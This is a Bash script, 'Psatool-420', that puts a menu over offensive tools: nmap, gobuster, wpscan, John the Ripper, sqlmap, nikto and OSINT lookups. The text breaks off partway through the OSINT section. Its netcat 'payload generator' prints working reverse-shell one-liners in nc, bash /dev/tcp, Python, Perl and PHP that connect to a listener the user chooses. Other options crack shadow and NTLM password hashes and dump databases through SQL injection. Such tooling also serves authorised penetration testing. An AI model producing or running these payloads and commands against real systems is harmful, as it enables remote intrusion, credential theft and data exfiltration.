#!/bin/bash
# Psatool-420 - Interactive Pentesting Automation Script

# Function to display the banner with figlet
show_banner() {
    clear
    figlet -f slant "Psatool-420" | lolcat
    echo -e "\n\033[1;34mInteractive Pentesting Automation\033[0m"
    echo -e "\033[1;33m=====================================\033[0m"
}

# Function to display the main menu
show_menu() {
    echo -e "\033[1;32m[*] Choose an option:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mRun Nmap Scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mRun Gobuster Scan\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mRun WPScan\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mRun John the Ripper\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mNetcat Payload Generator\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mRun SQLMap\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mRun Nikto\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mOSINT Tools\033[0m"
    echo -e "\033[1;36m9)\033[0m \033[1;31mExit\033[0m"
    echo -e "\033[1;33m=====================================\033[0m"
    echo -n "Please choose an option: "
}

# Function to run Nmap scan with enhanced options
run_nmap() {
    # Ask user for the target IP or domain
    echo -e "\n\033[1;34mEnter target IP or domain:\033[0m "
    read target

    if [[ -z "$target" ]]; then
        echo -e "\033[1;31mYou must provide a target IP or domain!\033[0m"
        return
    fi

    # Ask user for the type of Nmap scan (enhanced options)
    echo -e "\033[1;34mSelect Nmap Scan Type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic Scan (Ping Scan)\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mAggressive Scan (with version detection)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mPort Scan (Scan for Open Ports)\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mVulnerability Scan\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mStealth SYN Scan\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mService and Version Detection\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mOS Detection\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mUDP Scan\033[0m"
    echo -e "\033[1;36m9)\033[0m \033[1;32mComprehensive Scan (Slow but thorough)\033[0m"
    echo -n "Enter your choice: "
    read scan_choice

    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view

    # Run scan and display/save the results accordingly
    case $scan_choice in
        1)
            scan_cmd="nmap -sn $target"
            ;;
        2)
            scan_cmd="nmap -A -T4 -v $target"
            ;;
        3)
            scan_cmd="nmap -p- $target"
            ;;
        4)
            scan_cmd="nmap -sV --script vuln $target"
            ;;
        5)
            scan_cmd="nmap -sS -T2 $target"
            ;;
        6)
            scan_cmd="nmap -sV -sC $target"
            ;;
        7)
            scan_cmd="nmap -O --osscan-guess $target"
            ;;
        8)
            scan_cmd="nmap -sU --top-ports 100 $target"
            ;;
        9)
            scan_cmd="nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' $target"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
            return
            ;;
    esac

    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="nmap_scan_$(date +%Y%m%d_%H%M%S)"
        fi

        # Create results directory if it doesn't exist
        mkdir -p results

        # Run scan and save to file
        echo -e "\033[1;33m[*] Running Nmap scan and saving results...\033[0m"
        $scan_cmd -oN results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
        read
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        # Run scan and show results directly on terminal
        echo -e "\033[1;33m[*] Running Nmap scan and displaying results...\033[0m"
        $scan_cmd
        echo -e "\n\033[1;32m[*] Scan completed.\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
        read
    else
        echo -e "\033[1;31mInvalid choice. Returning to the main menu.\033[0m"
    fi
}


# Function to run Gobuster scan
run_gobuster() {
    # Ask for target URL
    echo -e "\n\033[1;34mEnter target URL (e.g., http://example.com):\033[0m "
    read target

    if [[ -z "$target" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi

    # Ask the user to select a wordlist (lite, medium, large, extra)
    echo -e "\033[1;34mChoose a wordlist to use (lite, medium, large, extra) or press Enter to use the default:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mLite\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mMedium\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mLarge\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mExtra\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCustom (enter path)\033[0m"
    echo -n "Enter your choice (default is 'medium'): "
    read wordlist_choice

    # Set default wordlist if none chosen
    case $wordlist_choice in
        1)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt"
            ;;
        2)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            ;;
        3)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt"
            ;;
        4)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-large.txt"
            ;;
        5)
            echo -e "\033[1;34mEnter the full path to your custom wordlist:\033[0m"
            read custom_wordlist
            if [[ -f "$custom_wordlist" ]]; then
                wordlist="$custom_wordlist"
            else
                echo -e "\033[1;31mFile not found. Using default wordlist.\033[0m"
                wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            fi
            ;;
        *)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            echo -e "\033[1;33mUsing default wordlist: 'directory-list-lowercase-2.3-medium.txt'\033[0m"
            ;;
    esac

    # Ask the user for the number of threads (default is 100)
    echo -e "\033[1;34mEnter the number of threads to use (default is 100):\033[0m"
    read threads
    if [[ -z "$threads" ]]; then
        threads=100
        echo -e "\033[1;33mUsing default threads: 100\033[0m"
    fi

    # Ask the user for file extensions to search for (default is php,html,js,css,txt)
    echo -e "\033[1;34mEnter file extensions to search for (default is php,html,js,css,txt):\033[0m"
    read extensions
    if [[ -z "$extensions" ]]; then
        extensions="php,html,js,css,txt"
        echo -e "\033[1;33mUsing default extensions: php,html,js,css,txt\033[0m"
    fi

    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view

    # Create results directory if it doesn't exist
    mkdir -p results

    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="gobuster_scan_$(date +%Y%m%d_%H%M%S)"
        fi

        # Run Gobuster and save to file
        echo -e "\033[1;33m[*] Running Gobuster scan and saving results...\033[0m"
        gobuster dir -u $target -w $wordlist -t $threads -x $extensions -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        # Run Gobuster and show results directly on terminal
        echo -e "\033[1;33m[*] Running Gobuster scan and displaying results...\033[0m"
        gobuster dir -u $target -w $wordlist -t $threads -x $extensions
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    else
        echo -e "\033[1;31mInvalid choice. Returning to the main menu.\033[0m"
    fi
}

# Function to run WPScan
run_wpscan() {
    echo -e "\n\033[1;34mEnter target URL (WordPress site):\033[0m "
    read target

    if [[ -z "$target" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi

    # Enhanced WPScan options
    echo -e "\033[1;34mSelect WPScan options:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mEnumerate users\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mEnumerate plugins\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mEnumerate themes\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mVulnerability detection\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mComprehensive scan\033[0m"
    echo -n "Enter your choice: "
    read wp_choice

    # Determine WPScan command based on user choice
    case $wp_choice in
        1)
            wp_cmd="wpscan --url $target --random-user-agent"
            ;;
        2)
            wp_cmd="wpscan --url $target --enumerate u --random-user-agent"
            ;;
        3)
            wp_cmd="wpscan --url $target --enumerate p --random-user-agent"
            ;;
        4)
            wp_cmd="wpscan --url $target --enumerate t --random-user-agent"
            ;;
        5)
            wp_cmd="wpscan --url $target --random-user-agent --api-token YOUR_API_TOKEN"
            echo -e "\033[1;33mNote: For full vulnerability detection, add your WPVulnDB API token in the script.\033[0m"
            ;;
        6)
            wp_cmd="wpscan --url $target --enumerate u,p,t,tt,cb,dbe --random-user-agent"
            ;;
        *)
            wp_cmd="wpscan --url $target --enumerate u --random-user-agent"
            echo -e "\033[1;33mUsing default scan options\033[0m"
            ;;
    esac

    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view

    # Create results directory if it doesn't exist
    mkdir -p results

    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="wpscan_$(date +%Y%m%d_%H%M%S)"
        fi

        # Run WPScan and save to file
        echo -e "\033[1;33m[*] Running WPScan and saving results...\033[0m"
        $wp_cmd -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        # Run WPScan and show results directly on terminal
        echo -e "\033[1;33m[*] Running WPScan and displaying results...\033[0m"
        $wp_cmd
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    else
        echo -e "\033[1;31mInvalid choice. Returning to the main menu.\033[0m"
    fi
}

# Function to run John the Ripper
run_john() {
    echo -e "\n\033[1;34m=== John the Ripper Password Cracking ===\033[0m"
    echo -e "\033[1;34mSelect operation:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mCrack Linux shadow file\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mCrack Windows hash (NTLM)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mCrack MD5 hash(es)\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mCrack SHA hash(es)\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCrack zip file password\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mCrack RAR file password\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mInput and crack hash directly\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mShow cracked passwords\033[0m"
    echo -n "Enter your choice: "
    read john_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $john_choice in
        1)
            echo -e "\033[1;34mEnter the path to the shadow file:\033[0m"
            read shadow_path
            if [[ ! -f "$shadow_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            echo -e "\033[1;34mEnter the path to the passwd file (press Enter to skip):\033[0m"
            read passwd_path
            
            # Ask if user wants to save results or view directly
            echo -e "\033[1;34mWould you like to (S)ave intermediary files or use (T)emporary files? (S/T):\033[0m"
            read save_choice
            
            if [[ -z "$passwd_path" ]]; then
                echo -e "\033[1;33m[*] Running John on shadow file...\033[0m"
                john --format=crypt "$shadow_path" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                if [[ ! -f "$passwd_path" ]]; then
                    echo -e "\033[1;31mPasswd file not found! Running John on shadow file only...\033[0m"
                    john --format=crypt "$shadow_path" --wordlist=/usr/share/wordlists/rockyou.txt
                else
                    echo -e "\033[1;33m[*] Creating unshadowed file...\033[0m"
                    if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                        unshadow "$passwd_path" "$shadow_path" > results/unshadowed.txt
                        echo -e "\033[1;32m[*] Unshadowed file saved to 'results/unshadowed.txt'\033[0m"
                        echo -e "\033[1;33m[*] Running John on unshadowed file...\033[0m"
                        john --wordlist=/usr/share/wordlists/rockyou.txt results/unshadowed.txt
                    else
                        # Use process substitution for temporary processing
                        echo -e "\033[1;33m[*] Running John on unshadowed data...\033[0m"
                        john --wordlist=/usr/share/wordlists/rockyou.txt <(unshadow "$passwd_path" "$shadow_path")
                    fi
                fi
            fi
            ;;
        2)
            echo -e "\033[1;34mEnter the path to the NTLM hash file:\033[0m"
            read ntlm_path
            if [[ ! -f "$ntlm_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            echo -e "\033[1;33m[*] Running John on NTLM hash file...\033[0m"
            john --format=NT "$ntlm_path" --wordlist=/usr/share/wordlists/rockyou.txt
            ;;
        3)
            echo -e "\033[1;34mEnter the path to the MD5 hash file or paste hash directly:\033[0m"
            read md5_input
            
            # Check if input is a file or direct hash
            if [[ -f "$md5_input" ]]; then
                echo -e "\033[1;33m[*] Running John on MD5 hash file...\033[0m"
                john --format=raw-md5 "$md5_input" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                echo -e "\033[1;33m[*] Running John on provided MD5 hash...\033[0m"
                echo "$md5_input" > /tmp/temp_md5_hash.txt
                john --format=raw-md5 /tmp/temp_md5_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
                rm /tmp/temp_md5_hash.txt
            fi
            ;;
        4)
            echo -e "\033[1;34mEnter the path to the SHA hash file or paste hash directly:\033[0m"
            read sha_input
            
            echo -e "\033[1;34mSelect SHA format:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mSHA1\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mSHA256\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mSHA512\033[0m"
            echo -n "Enter your choice: "
            read sha_choice
            
            case $sha_choice in
                1)
                    format="raw-sha1"
                    ;;
                2)
                    format="raw-sha256"
                    ;;
                3)
                    format="raw-sha512"
                    ;;
                *)
                    format="raw-sha1"
                    echo -e "\033[1;33mUsing default format: SHA1\033[0m"
                    ;;
            esac
            
            # Check if input is a file or direct hash
            if [[ -f "$sha_input" ]]; then
                echo -e "\033[1;33m[*] Running John on SHA hash file...\033[0m"
                john --format=$format "$sha_input" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                echo -e "\033[1;33m[*] Running John on provided SHA hash...\033[0m"
                echo "$sha_input" > /tmp/temp_sha_hash.txt
                john --format=$format /tmp/temp_sha_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
                rm /tmp/temp_sha_hash.txt
            fi
            ;;
        5)
            echo -e "\033[1;34mEnter the path to the ZIP file:\033[0m"
            read zip_path
            if [[ ! -f "$zip_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            # Ask if user wants to save hash file
            echo -e "\033[1;34mWould you like to (S)ave generated hash file or use (T)emporary file? (S/T):\033[0m"
            read save_choice
            
            echo -e "\033[1;33m[*] Converting ZIP file for John...\033[0m"
            if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                zip2john "$zip_path" > results/zip_hash.txt
                echo -e "\033[1;32m[*] ZIP hash saved to 'results/zip_hash.txt'\033[0m"
                echo -e "\033[1;33m[*] Running John on ZIP hash...\033[0m"
                john results/zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            else
                # Use process substitution for temporary processing
                echo -e "\033[1;33m[*] Running John on ZIP hash...\033[0m"
                john --wordlist=/usr/share/wordlists/rockyou.txt <(zip2john "$zip_path")
            fi
            ;;
        6)
            echo -e "\033[1;34mEnter the path to the RAR file:\033[0m"
            read rar_path
            if [[ ! -f "$rar_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            # Ask if user wants to save hash file
            echo -e "\033[1;34mWould you like to (S)ave generated hash file or use (T)emporary file? (S/T):\033[0m"
            read save_choice
            
            echo -e "\033[1;33m[*] Converting RAR file for John...\033[0m"
            if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                rar2john "$rar_path" > results/rar_hash.txt
                echo -e "\033[1;32m[*] RAR hash saved to 'results/rar_hash.txt'\033[0m"
                echo -e "\033[1;33m[*] Running John on RAR hash...\033[0m"
                john results/rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            else
                # Use process substitution for temporary processing
                echo -e "\033[1;33m[*] Running John on RAR hash...\033[0m"
                john --wordlist=/usr/share/wordlists/rockyou.txt <(rar2john "$rar_path")
            fi
            ;;
        7)
            echo -e "\033[1;34mEnter the hash to crack:\033[0m"
            read direct_hash
            if [[ -z "$direct_hash" ]]; then
                echo -e "\033[1;31mNo hash provided!\033[0m"
                return
            fi
            
            echo -e "\033[1;34mSelect hash format:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mMD5\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mSHA1\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mSHA256\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mSHA512\033[0m"
            echo -e "\033[1;36m5)\033[0m \033[1;32mNTLM\033[0m"
            echo -n "Enter your choice: "
            read format_choice
            
            case $format_choice in
                1)
                    format="raw-md5"
                    ;;
                2)
                    format="raw-sha1"
                    ;;
                3)
                    format="raw-sha256"
                    ;;
                4)
                    format="raw-sha512"
                    ;;
                5)
                    format="NT"
                    ;;
                *)
                    format="raw-md5"
                    echo -e "\033[1;33mUsing default format: MD5\033[0m"
                    ;;
            esac
            
            echo -e "\033[1;33m[*] Running John on provided hash...\033[0m"
            echo "$direct_hash" > /tmp/temp_direct_hash.txt
            john --format=$format /tmp/temp_direct_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            rm /tmp/temp_direct_hash.txt
            ;;
        8)
            echo -e "\033[1;33m[*] Showing cracked passwords...\033[0m"
            john --show all
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
            return
            ;;
    esac
    
    echo -e "\033[1;32m[*] John the Ripper operation completed.\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to generate Netcat payloads
run_netcat() {
    echo -e "\n\033[1;34m=== Netcat Payload Generator ===\033[0m"
    echo -e "\033[1;34mEnter listener IP address:\033[0m"
    read listener_ip
    
    if [[ -z "$listener_ip" ]]; then
        echo -e "\033[1;31mYou must provide an IP address!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mEnter listener port:\033[0m"
    read listener_port
    
    if [[ -z "$listener_port" ]]; then
        echo -e "\033[1;31mYou must provide a port number!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect payload type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic reverse shell (Linux)\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mBasic reverse shell (Windows)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mBash reverse shell\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mPython reverse shell\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mPerl reverse shell\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mPHP reverse shell\033[0m"
    echo -n "Enter your choice: "
    read payload_choice
    
    echo -e "\n\033[1;32m[*] Generated Payload:\033[0m"
    case $payload_choice in
        1)
            echo -e "\033[1;33mnc $listener_ip $listener_port -e /bin/bash\033[0m"
            ;;
        2)
            echo -e "\033[1;33mnc.exe $listener_ip $listener_port -e cmd.exe\033[0m"
            ;;
        3)
            echo -e "\033[1;33mbash -i >& /dev/tcp/$listener_ip/$listener_port 0>&1\033[0m"
            ;;
        4)
            echo -e "\033[1;33mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$listener_ip\",$listener_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[0m"
            ;;
        5)
            echo -e "\033[1;33mperl -e 'use Socket;\$i=\"$listener_ip\";\$p=$listener_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\033[0m"
            ;;
        6)
            echo -e "\033[1;33mphp -r '\$sock=fsockopen(\"$listener_ip\",$listener_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\033[0m"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! No payload generated.\033[0m"
            ;;
    esac
    
    echo -e "\n\033[1;32m[*] Start listener with: nc -lvp $listener_port\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run SQLMap for SQL injection testing
run_sqlmap() {
    echo -e "\n\033[1;34m=== SQLMap SQL Injection Scanner ===\033[0m"
    echo -e "\033[1;34mEnter target URL (with parameter, e.g., http://example.com/page.php?id=1):\033[0m"
    read target_url
    
    if [[ -z "$target_url" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect scan type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mDatabase fingerprint\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mList tables\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mDump database\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mAdvanced options\033[0m"
    echo -n "Enter your choice: "
    read sqlmap_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $sqlmap_choice in
        1)
            echo -e "\033[1;33m[*] Running basic SQLMap scan...\033[0m"
            sqlmap -u "$target_url" --batch
            ;;
        2)
            echo -e "\033[1;33m[*] Running database fingerprint scan...\033[0m"
            sqlmap -u "$target_url" --batch --fingerprint
            ;;
        3)
            echo -e "\033[1;33m[*] Getting database tables...\033[0m"
            sqlmap -u "$target_url" --batch --tables
            ;;
        4)
            echo -e "\033[1;33m[*] Attempting to dump database...\033[0m"
            sqlmap -u "$target_url" --batch --dump
            ;;
        5)
            echo -e "\033[1;34mEnter custom SQLMap parameters:\033[0m"
            read custom_params
            echo -e "\033[1;33m[*] Running SQLMap with custom parameters...\033[0m"
            sqlmap -u "$target_url" $custom_params
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
            return
            ;;
    esac
    
    echo -e "\n\033[1;32m[*] SQLMap scan completed.\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run Nikto Web Scanner
run_nikto() {
    echo -e "\n\033[1;34m=== Nikto Web Vulnerability Scanner ===\033[0m"
    echo -e "\033[1;34mEnter target URL (e.g., http://example.com):\033[0m"
    read target_url
    
    if [[ -z "$target_url" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect scan options:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mTuning options (select specific tests)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mFull scan with SSL check\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mScan with authentication\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCustom options\033[0m"
    echo -n "Enter your choice: "
    read nikto_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view
    
    # Build the Nikto command based on user's choice
    case $nikto_choice in
        1)
            nikto_cmd="nikto -h $target_url"
            ;;
        2)
            echo -e "\033[1;34mSelect tuning options (multiple options can be selected):\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mFile Upload\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mMisconfiguration\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mInformation Disclosure\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mInjection\033[0m"
            echo -e "\033[1;36m5)\033[0m \033[1;32mAll tests\033[0m"
            echo -n "Enter your choices (e.g., 124 for options 1, 2, and 4): "
            read tuning_options
            
            case $tuning_options in
                1)
                    tune_param="x"
                    ;;
                2)
                    tune_param="c"
                    ;;
                3)
                    tune_param="i"
                    ;;
                4)
                    tune_param="a"
                    ;;
                5)
                    tune_param="0123456789abcde"
                    ;;
                *)
                    # Convert input string to tuning parameters
                    tune_param=""
                    [[ $tuning_options == *"1"* ]] && tune_param+="x"
                    [[ $tuning_options == *"2"* ]] && tune_param+="c"
                    [[ $tuning_options == *"3"* ]] && tune_param+="i"
                    [[ $tuning_options == *"4"* ]] && tune_param+="a"
                    
                    # Default if nothing was selected
                    [[ -z "$tune_param" ]] && tune_param="0123456789abcde"
                    ;;
            esac
            
            nikto_cmd="nikto -h $target_url -Tuning $tune_param"
            ;;
        3)
            nikto_cmd="nikto -h $target_url -ssl -no404"
            ;;
        4)
            echo -e "\033[1;34mEnter username:\033[0m"
            read auth_user
            echo -e "\033[1;34mEnter password:\033[0m"
            read auth_pass
            
            nikto_cmd="nikto -h $target_url -id $auth_user:$auth_pass"
            ;;
        5)
            echo -e "\033[1;34mEnter custom Nikto parameters:\033[0m"
            read custom_params
            
            nikto_cmd="nikto -h $target_url $custom_params"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Using basic scan.\033[0m"
            nikto_cmd="nikto -h $target_url"
            ;;
    esac
    
    # Run Nikto based on whether to save or view
    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="nikto_scan_$(date +%Y%m%d_%H%M%S)"
        fi
        
        echo -e "\033[1;33m[*] Running Nikto scan and saving results...\033[0m"
        $nikto_cmd -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        echo -e "\033[1;33m[*] Running Nikto scan and displaying results...\033[0m"
        $nikto_cmd
        echo -e "\n\033[1;32m[*] Scan completed.\033[0m"
    else
        echo -e "\033[1;31mInvalid choice. Using view mode.\033[0m"
        echo -e "\033[1;33m[*] Running Nikto scan and displaying results...\033[0m"
        $nikto_cmd
        echo -e "\n\033[1;32m[*] Scan completed.\033[0m"
    fi
    
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run OSINT tools
run_osint() {
    echo -e "\n\033[1;34m=== OSINT Tools ===\033[0m"
    echo -e "\033[1;34mSelect OSINT tool:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mWhois Lookup\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mDNS Enumeration\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mEmail Harvester\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mSubdomain Finder\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mGoogle Dorks Generator\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mMetadata Extractor\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mShodan Search\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;31mBack to Main Menu\033[0m"
    echo -n "Enter your choice: "
    read osint_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $osint_choice in
        1)
            # Whois Lookup
            echo -e "\033[1;34mEnter domain name or IP address:\033[0m"
            read target
            if [[ -z "$target" ]]; then
                echo -e "\033[1;31mTarget required!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Running Whois lookup...\033[0m"
            whois $target
            echo -e "\n\033[1;32m[*] Whois lookup completed.\033[0m"
            ;;
            
        2)
            # DNS Enumeration with dig, host, or nslookup
            echo -e "\033[1;34mEnter domain name:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Running DNS enumeration...\033[0m"
            echo -e "\033[1;36m=== A Records ===\033[0m"
            dig +short A $domain
            echo -e "\n\033[1;36m=== MX Records ===\033[0m"
            dig +short MX $domain
            echo -e "\n\033[1;36m=== NS Records ===\033[0m"
            dig +short NS $domain
            echo -e "\n\033[1;36m=== TXT Records ===\033[0m"
            dig +short TXT $domain
            echo -e "\n\033[1;32m[*] DNS enumeration completed.\033[0m"
            ;;
            
        3)
            # Email Harvester using theHarvester
            echo -e "\033[1;34mEnter domain to search for emails:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
